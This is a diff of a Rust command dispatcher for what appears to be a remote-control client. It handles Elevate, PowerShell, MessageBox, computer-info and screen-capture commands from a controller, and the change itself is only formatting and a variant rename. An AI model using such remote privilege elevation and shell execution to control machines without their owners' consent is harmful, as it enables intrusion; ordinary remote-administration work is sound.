@@ -4,7 +4,7 @@ use std::sync::{Arc, atomic::AtomicBool};
 
 use crate::{
     capture,
-    commands::{powershell, computer_info, elevate, message_box},
+    commands::{computer_info, elevate, message_box, powershell},
 };
 
 pub fn send(response: BaseResponse, tx: &Sender<Vec<u8>>) {
@@ -39,13 +39,28 @@ pub fn main(command: BaseCommand, tx: Sender<Vec<u8>>, capture_running: Option<A
             );
         }
         Command::Elevate => {
-            send(match elevate::main() {
-                Ok(info) => BaseResponse { id: command.id, response: info },
-                Err(err) => BaseResponse { id: command.id, response: Response::Error(err.to_string())}
-            }, &tx);
-        },
-        Command::Powershell(cmd) => {
-            send(BaseResponse { id: command.id, response: powershell::main(cmd) }, &tx);
+            send(
+                match elevate::main() {
+                    Ok(info) => BaseResponse {
+                        id: command.id,
+                        response: info,
+                    },
+                    Err(err) => BaseResponse {
+                        id: command.id,
+                        response: Response::Error(err.to_string()),
+                    },
+                },
+                &tx,
+            );
+        }
+        Command::PowerShell(cmd) => {
+            send(
+                BaseResponse {
+                    id: command.id,
+                    response: powershell::main(cmd),
+                },
+                &tx,
+            );
         }
         Command::MessageBox(args) => send(
             match message_box::main(args) {
